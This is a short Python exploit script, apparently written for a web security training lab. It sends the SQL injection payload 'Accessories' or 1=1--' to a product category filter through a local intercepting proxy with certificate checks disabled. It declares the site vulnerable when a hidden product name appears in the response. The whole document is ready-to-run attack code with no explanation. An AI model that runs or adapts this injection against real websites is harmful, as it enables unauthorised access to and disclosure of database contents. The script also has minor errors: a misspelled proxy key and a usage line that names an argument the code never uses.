#!/bin/python3
import urllib3
import requests
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http": "http://127.0.0.1:8080", "https:": "http://127.0.0.1:8080"}


def exploit(url):
    uri = "/filter?category="
    payload = "Accessories'+or+1%3d1--"
    r = requests.get(url + uri + payload, proxies=proxies, verify=False)
    if "Eye Projectors" in r.text:
        return True
    else:
        return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage %s <URL> <Payload> \n" % sys.argv[0])
        sys.exit(-1)
    if exploit(url):
        print("This site is vulnerable. SQLi Successful")
    else:
        print("[-] SQLi Unsuccessful")
